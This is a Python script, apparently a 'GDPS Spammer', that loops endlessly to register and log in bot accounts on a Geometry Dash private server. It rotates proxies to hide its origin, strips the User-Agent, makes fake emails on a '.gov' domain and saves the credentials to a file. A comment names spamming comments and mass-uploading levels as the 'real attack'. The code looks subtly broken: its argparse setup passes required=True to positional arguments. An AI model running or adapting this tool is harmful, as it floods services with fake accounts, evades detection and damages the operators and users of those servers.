# from urllib.request import urlopen
# from threading import Thread
from typing import Optional
import time
import requests
import random
import argparse 
import sys 




def main(database:str, username:str, password:Optional[str] = None, email_endpoint="matmart.gov", proxies:list[str] = []):

    
    num = random.randint(100000, 100000000)

    userName = f"{num}{username}"
    userpass = password if password else str(num)
    email = str(num) + f'{username}@{email_endpoint}'

    with requests.Session() as s:
        # setup proxies with we have any...
        if proxies:
            proxy = random.choice(proxies)
            # Allow for non-ssl and ssl protocols to be passed through without leaking ourselves in the process...
            s.proxies = {"http":proxy, "https":proxy}

        # If we do not make it then return false so that the tool can report that failure has taken place...

        resp = s.post(f'{database}/accounts/registerGJAccount.php',headers={"User-Agent":""},
            data={
              'userName': userName, 
              'password': userpass, 
              'email': email}
            )
        # It could be -10 or -6 for failure so i'll just simplify the status we want to check... - Calloc
        if resp.status_code != 200 or resp.text.startswith("-"):
            return False 

        resp = s.post(
        	f'{database}/accounts/loginGJAccount.php', headers={"User-Agent":""},
            	data={'userName':userName,'password': userpass})
        
        if resp.status_code != 200 or resp.text.startswith("-"):
            return False 
        
    # TODO (CALLOC) Add the ability to make optional filenames for accounts to be saved to...
    with open("accounts.txt", "a") as f:
        f.write(f"{userName}:{userpass}\n")

    print(f"[+] Account Created:{userName}:{userpass}    email:{email}")
    return True 



print("GDPS Spammer by Arthumi")

parser = argparse.ArgumentParser(description="A simple python spammer to make thousands of bots per hour")
parser.add_argument("database",required=True,help="The database of the gdps server to log into")
parser.add_argument("username",required=True,help="The Username of the user you wish to use")
parser.add_argument("--password",default=None,help="The password to all of the accounts default is the random number given to that user...")
parser.add_argument("--proxy-list",type=argparse.FileType(), help="Takes a proxy list of urls and forwards them at random to the server for obfuscation be sure to have them like in this example:\"socks5://127.0.0.1:5050\"")
parser.add_argument("--email-endpont", "-ee", default="matmart.gov", dest="email",help="an email address endpoint to forward example \"matmart.gov\" which is the default")

args = parser.parse_args()
# Read all lines from our proxy list 
proxies = args.proxy_list.readlines() if args.proxy_list else []

# TODO (Calloc) limit accounts instead incase we wanted to Spam Comments and Mass Upload levels as our real attack...
try:
    while True:
        if not main(args.database,args.username, args.password, args.email, proxies):
            print("[!] Login Failed")
except KeyboardInterrupt or SystemExit:
    print("[ABORTING] Exiting Loop...")
    sys.exit()
except BaseException as e:
    print(f"[ERROR]: {e}")
    raise e

